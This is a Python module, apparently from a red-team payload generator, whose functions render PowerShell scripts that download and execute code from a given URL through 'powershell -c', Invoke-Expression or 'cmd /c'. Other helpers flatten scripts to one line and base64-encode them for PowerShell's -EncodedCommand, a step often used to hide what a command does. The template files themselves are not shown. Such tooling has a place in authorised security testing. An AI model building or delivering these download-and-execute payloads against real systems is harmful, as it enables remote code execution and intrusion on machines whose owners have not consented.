import os, sys
from base64 import b64encode
from jinja2 import Template
import logging

# necessary to make it possible to execute this file from this directory
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from model import *
from helpers import *


@DataTracker
def makePsScriptToPsCommandByDownloadCmd(url: str) -> AceStr:
    """Return a PsScript which downloads and executes a PsCommand with 'powershell -c'"""
    script = renderTemplate(
        'make/powershell/download_exec_pscmd_ps.ps1',
        url=url
    )
    return AceStr(script)


@DataTracker
def makePsScriptToPsCommandByDownloadIe(url: str) -> AceStr:
    """Return a PsScript which downloads and executes PsCommand with 'Invoke-Expression'"""
    script = renderTemplate(
        'make/powershell/download_exec_pscmd_ie.ps1',
        url=url
    )
    return AceStr(script)


@DataTracker
def makePsScriptToCmdByDownloadCmd(url: str) -> AceStr:
    """Return a PsScript which downloads and executes Cmdline with 'cmd /c'"""
    script = renderTemplate(
        'make/powershell/download_exec_cmd_cmd.ps1',
        url=url
    )
    return AceStr(script)


@DataTracker
def makePsScriptMessagebox() -> AceStr:
    """Return a PsScript which simply outputs a popup"""
    script = renderTemplate('make/powershell/messagebox.ps1')
    return AceStr(script)


@DataTracker
def makePsCommandFromPsScript(input: str) -> AceStr:
    """Make input compatible with 'PowerShell.exe -Command {}'"""
    ret = toPowershellLine(input)
    return AceStr(ret)


@DataTracker
def makePsEncodedCommand(input: str) -> AceStr:
    '''Make input compatible with "PowerShell.exe -EncodedCommand {}"'''
    text = toPowershellLine(input)
    # https://stackoverflow.com/questions/71642299/how-to-use-python-to-represent-the-powershell-tobase64string-function
    text = bytearray(text, 'utf-16-le')
    b64 = b64encode(text).decode() # bytearray to str
    return AceStr(b64)


def toPowershellLine(input: AceStr) -> AceStr:
    """Tries converting file-content with powershell code into a single line"""
    # check if there's a ; at the end of each line
    lines = input.splitlines()
    for line in lines:
        line = line.strip()
        if not line.endswith(';'):
            logger.warn("Powershell script without ';' at end of line: {}.".format(line))
            #logger.warn("  Adding the ';'")
            #line += '; '

    # remove all newlines
    input = input.replace('\r\n', '')
    input = input.replace('\n', '')

    return input
